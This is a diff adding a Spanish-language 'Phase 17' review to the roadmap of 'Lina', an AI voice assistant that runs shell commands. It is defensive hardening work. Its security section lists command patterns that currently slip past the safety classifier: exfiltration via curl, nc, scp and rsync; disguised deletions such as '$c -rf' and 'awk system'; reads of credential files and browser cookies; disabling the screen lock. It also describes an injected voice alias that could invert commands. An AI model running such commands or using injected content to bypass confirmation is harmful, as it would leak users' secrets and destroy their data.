@@ -15,6 +15,7 @@ Tamaños relativos: **S** pequeña, **M** media, **L** grande.
 | 13 | Memoria de preferencias *(hecha: falta probarla en el equipo de Dani)* | M | — |
 | 14 | Bluetooth completo y más diagnóstico de juegos *(hecha: falta probarla en el equipo de Dani)* | S | 12 (para sus órdenes directas) |
 | 15 | GPU y energía (módulo opcional) *(hecha: falta probarla en el equipo de Dani)* | M | — |
+| 17 | Revisión de octubre de 2026: seguridad, latencia y voz, autonomía y mantenimiento *(en curso: 17.S1 hecha)* | L | — |
 
 Fuera del plan, a propósito: excluir monitores de las capturas (Lina captura todos), una ventana de chat con historial (Lina es de voz) y quitar las
 confirmaciones por atajo (es una decisión de seguridad, no una carencia).
@@ -190,6 +191,89 @@ Idea apuntada, sin empezar. Lina no lleva un agente de programación dentro: le 
 - **Seguridad**: apagado por defecto, limitado a una carpeta, confirmación con el atajo antes de empezar, lo que lea de webs o archivos se trata como datos y su propio código y ajustes quedan fuera de su alcance.
 - **Voz**: tareas largas en segundo plano con aviso al terminar.
 - **Privacidad y coste**: el código que toque sale al proveedor y gasta de su cuenta; se explica antes de activarlo.
+
+## Fase 17 — Revisión de octubre de 2026 (L, por partes)
+
+Sale de una revisión del código completo (23 y 24 de octubre de 2026). Cada punto es un cambio pequeño **con su prueba y su línea en el CHANGELOG**, y se hace
+**de uno en uno**, con el plan aprobado antes de tocar código. Tamaños: **S** pequeño, **M** medio, **L** grande.
+
+### Qué se midió antes de proponer nada (seguridad)
+Se pasaron ~50 comandos por el clasificador (`tratar_borrado` + `clasificar`) con un `$HOME` de prueba **fuera** de las zonas desechables (en `/tmp` los
+borrados salen como autónomos por estar en zona desechable; esa primera medida no valía). Lo que se ejecuta **sin confirmar y sin poder deshacerse** con el
+perfil `autonomo`:
+- **Sacar archivos del equipo**: `curl -d/-F/--data-binary @archivo`, `curl -T`, `curl "…?q=$(cat … | base64)"`, `wget --post-file`, `tar … | curl -T -`, `scp`,
+  `rsync … usuario@host:`, `nc host puerto < archivo`.
+- **Borrar por rodeos**: `git clean -fdx`, `c=rm; $c -rf …`, `busybox rm -rf …`, `awk 'BEGIN{system("rm …")}'`, `perl -e 'unlink …'`, `vim -c ':!rm …'`,
+  `systemd-run --user rm …`.
+- **Ejecutar scripts fuera de Descargas**: `bash ~/proyecto/x.sh`, `source ~/proyecto/x.sh` (en `~/Descargas` sí se confirma).
+- **Leer credenciales** (salen como lectura y van a la IA): `~/.config/gh/hosts.yml`, `~/.docker/config.json`, `~/.kube/config`, `~/.git-credentials`, historiales de
+  bash y fish, `env`; y `sqlite3` sobre las cookies de Brave/Chromium (las de Firefox sí están bloqueadas).
+- **Quitar el bloqueo de pantalla**: `gsettings … screensaver lock-enabled false`, `kwriteconfig6 --file kscreenlockerrc … Autolock false`.
+
+Lo que ya está bien: `rm` va a la papelera; `shred`, `truncate` y `dd` sobre tus archivos se confirman; `find -delete`, `env rm`, `command rm` y `\rm` se bloquean;
+`> archivo` y `mv` se ejecutan solos pero el diario guarda copia y se deshacen.
+
+### Seguridad
+| # | Qué | Tamaño |
+|---|---|---|
+| S1 | **Modo privado solo por código** *(hecha)*: la IA solo puede activarlo; quitarlo, frase exacta de `comandos.txt` y solo con el atajo. | S |
+| S2 | **La IA no escribe alias de voz**: hoy `alias_de_voz` solo exige que lo oído aparezca en tus últimas frases y «significa» es libre, así que un alias inyectado («conecta = desconecta») invertiría órdenes futuras antes de llegar a `directas`. La IA solo podrá listarlos; apuntar y borrar, solo por tus frases («cuando oigas X quiero decir Y»), que ya resuelve el código. | S |
+| S3 | **VRAM antes de cargar Ollama**: el plan B (`preguntar_local` sin herramientas) carga `qwen3-vl:8b` sin mirar nada y puede pasar del tope de 4 GB junto a Whisper. Comprobar el tamaño del modelo y la VRAM libre antes; si no cabe dentro del tope, no se carga y se dice. | S |
+| S4 | **Más secretos**: añadir a la lista de credenciales `gh`, `docker`, `kube`, `.git-credentials`, historiales de shell y los perfiles de Chromium/Brave/Vivaldi (`Cookies`, `Login Data`); `env`/`printenv` pasan a tapar valores que parezcan claves. | S |
+| S5 | **Red de salida bloqueada en tareas contaminadas**: si en la tarea se ha leído contenido de fuera, los comandos que **envían** datos (las formas de la lista de arriba, `ssh` con orden remota, `socat`) se bloquean, sea cual sea el perfil. Descargar (`curl -o`, `wget` sin datos) sigue igual. Sin contenido de fuera no cambia nada. | M |
+| S6 | **Cerrar los rodeos medidos**, cada uno con su prueba: variable usada como programa (`$c …`) → crítico; `busybox`/`toybox` se analizan como el programa que llaman; `awk/gawk … system(`, `perl/ruby -e` → como `python -c` (código en línea); `vim/nvim -c ':!'`, `less +!` → crítico; `systemd-run`, `run0`, `setsid` → se analiza la orden de dentro; `git clean -f` → borrado definitivo; ejecutar un script de cualquier carpeta tuya → software de fuera; bloqueo de pantalla (`gsettings`, `kscreenlockerrc`) → cuentas y credenciales. | M |
+| S7 | **Origen por petición en la cola de «además»**: lo que apuntas para después con «Oye Lina» hereda `origen_voz_libre` del último que habló, no el suyo; si entretanto pulsas el atajo, esa frase contaría como dicha con el atajo. Cada entrada de la cola guarda su origen. | S |
+| S8 | **`lina update` a releases**: hoy sigue `main` (cada commit, no las versiones). Pasar a la última etiqueta `vX.Y.Z-beta` con `git verify-tag`, y fijar dependencias (archivo de restricciones o `uv.lock`) para que un `faster-whisper` o `piper-tts` nuevo no rompa Lina sin aviso. | M |
+| S9 | **Fase aparte: aislar los comandos de la IA con `bwrap`** (o `systemd-run --user -p ProtectHome=read-only`): carpetas escribibles por lista, red solo cuando haga falta. Es la defensa de fondo frente a una lista negra sobre bash, que nunca estará completa. **Diseño primero** (qué carpetas, cómo convive con el diario, la papelera, `sudo` y los programas con ventana), sin código hasta aprobarlo. | L |
+
+### Latencia y voz
+| # | Qué | Tamaño |
+|---|---|---|
+| V1 | **Cola de voz**: hoy `_hablar` usa un solo `respuesta.wav` y un solo `self.reproductor`; avisos sueltos («lo pienso a fondo», «Google está tardando», el estado) pueden coincidir, pisarse el audio, y «cállate» solo para uno. Un hablante cada vez, archivos propios por frase. | S |
+| V2 | **Captura de pantalla solo cuando haga falta**: hoy se hace en cada pulsación, también en modo privado o sin permiso. | S |
+| V3 | **Fin de frase por silencio con el atajo** (ajuste, apagado por defecto hasta medirlo): una pulsación en vez de dos, con el detector que ya usa el manos libres. Medir con `lina tiempos` y `probar-voz` que no corta frases. | M |
+| V4 | **Instrucciones más ligeras**: cada llamada lleva ~16 000 caracteres de instrucciones y 5 000–14 000 de herramientas, y se repiten en cada vuelta. Primero medir si la caché de Gemini se aprovecha (`cachedContentTokenCount` en el registro); después pasar las reglas de situaciones concretas (música, navegador…) a sus grupos. | M |
+| V5 | **Respuesta y voz por frases** (streaming): empezar Piper con la primera frase. Poco para respuestas de una frase; se nota en el modo «a fondo». Después de V1. | M |
+| V6 | **Detector de palabra clave para «Oye Lina»** (p. ej. openWakeWord, en CPU, sin VRAM) en vez de pasar Whisper por cada trozo con voz. Opcional y medido como `probar-voz` (falsos positivos por hora, aciertos, CPU). Ojo con las licencias: los modelos preentrenados de openWakeWord no son de uso comercial; habría que entrenar el de «Oye Lina». | M |
+
+### Autonomía
+| # | Qué | Tamaño |
+|---|---|---|
+| A1 | **Medir la memoria antes de cambiarla**. Hoy un recuerdo es pertinente si comparte **una** raíz de palabra con la petición, y eso además desactiva las órdenes directas y las recetas. Paso 1 (S): una tanda de pares (petición, recuerdo, ¿viene al caso?) escrita a mano y una orden `lina memoria medir` que cuente aciertos, falsos positivos y órdenes directas que se pierden con «1 palabra en común» frente a «2 o más». Paso 2, **solo si no basta** (M): embeddings pequeños en CPU (modelo multilingüe de ~100 MB con ONNX), **opcionales y apagados por defecto**, medidos con la misma tanda (aciertos, tiempo por petición, memoria) como hace `probar-voz`. Nada de VRAM. | S + M |
+| A2 | **Banco de pruebas de la IA**: frases → herramientas esperadas, con respuestas grabadas para la CI y una pasada real opcional. Sin él, cada cambio de instrucciones o de modelo (los `-latest` cambian sin avisar) es a ciegas. | M |
+| A3 | **Modelos fijados** en vez de `-latest`, y cambiar de versión solo tras pasar A2. Después de A2. | S |
+| A4 | **`lina di "frase"`**: hablarle por texto a la Lina en marcha (sin micrófono, para pruebas completas reproducibles). Cuenta como manos libres: no confirma nada, porque cualquier programa local podría llamarlo. | S |
+| A5 | **Más contexto, con las mismas reglas que las capturas**: portapapeles, texto seleccionado y archivo seleccionado en Dolphin («resume esto», «manda este archivo»), solo cuando la frase lo pide. | M |
+| A6 | **Tareas largas**: plan con pasos y progreso que sobrevive a un reinicio, y tareas programadas («cada lunes vacía Descargas») que pasan por el ejecutor y el diario como todo. | L |
+| A7 | **Avisos por iniciativa propia, opcionales**: disco casi lleno, batería baja, actualizaciones pendientes. Apagados por defecto. | M |
+
+### Mantenimiento
+| # | Qué | Tamaño |
+|---|---|---|
+| M1 | **Las pruebas no deben tocar el `$HOME` real**: importar `comandos.py` ya llama a `rutas.editable("comandos.txt")`, que copia el archivo de fábrica a `~/.config/lina` si falta, y el proceso de pytest no cambia `HOME` (las suites sí). `conftest.py` debería poner `HOME` y las XDG en una carpeta temporal antes de importar nada. A comprobar primero. | S |
+| M2 | **Registro de herramientas**: `_ejecutar_herramienta` es una cadena de `if` de ~170 líneas; un diccionario `{nombre: función}` junto a cada declaración. | M |
+| M3 | **Estado de la petición en una clase** (`TareaActual`, reiniciada en `nueva_tarea`) en vez de 44 `getattr(self, …, defecto)`; cambiar `estado` siempre con el cerrojo (hoy `decir` y `avisar` no lo cogen). | M |
+| M4 | **Resultados con estructura** (`rc`, salida, comprobado, preparado) que se convierten en texto solo para la IA, en vez de comparar prefijos como `"código de salida: 0"` o `"COMPROBADO AHORA"`. Poco a poco, herramienta a herramienta. | L |
+| M5 | **mypy más estricto** (`check_untyped_defs`) en los módulos grandes, uno a uno, empezando por `herramientas.py`. | M |
+| M6 | En CLAUDE.md, `ruff` como `uvx ruff check src tests` (en el equipo del mantenedor `ruff` no está en el PATH). | S |
+
+### Orden propuesto
+1. **S1** (hecha), **S2**, **S3**: lo aprobado.
+2. **S4**, **S5**, **S6** (cada rodeo por separado), **S7**: la seguridad estrecha, de lo más sencillo a lo más delicado.
+3. **M1**: antes de seguir añadiendo pruebas.
+4. **V1**, **V2**: pequeñas y se notan cada día.
+5. **A1 paso 1** (medir la memoria) y **A2** (banco de la IA): medir antes de decidir.
+6. **V3**, **V4**, **A4**, **A3**.
+7. **M2**, **M3**, **S8**.
+8. **S9** (diseño de `bwrap`) cuando lo anterior esté probado; **V5**, **V6**, **A5**–**A7**, **M4**, **M5** según la demanda real.
+
+### Fuera, a propósito
+- **Cambiar el perfil por defecto o `frenar_cambios`**: decisión del mantenedor; S4–S6 cubren lo medido sin tocar la autonomía.
+- **Que lo desconocido pida confirmación** (invertir la lógica): decisión del mantenedor, por la misma razón.
+- **Corrector de Whisper con IA local, `hotwords` y `acercar`**: ya medidos y descartados (ver «Decisiones tomadas» en CLAUDE.md).
+- **Una ventana de chat**: Lina es de voz; `lina di` (A4) es para probar y para usarla en silencio, sin historial ni ventana.
+- **Nada que suba de 4 GB de VRAM**: por eso los embeddings (A1) y el detector de palabra clave (V6) van en la CPU.
+- **Quitar las confirmaciones por atajo**: es una decisión de seguridad, no una carencia.
 
 ## Orden y entregas
 
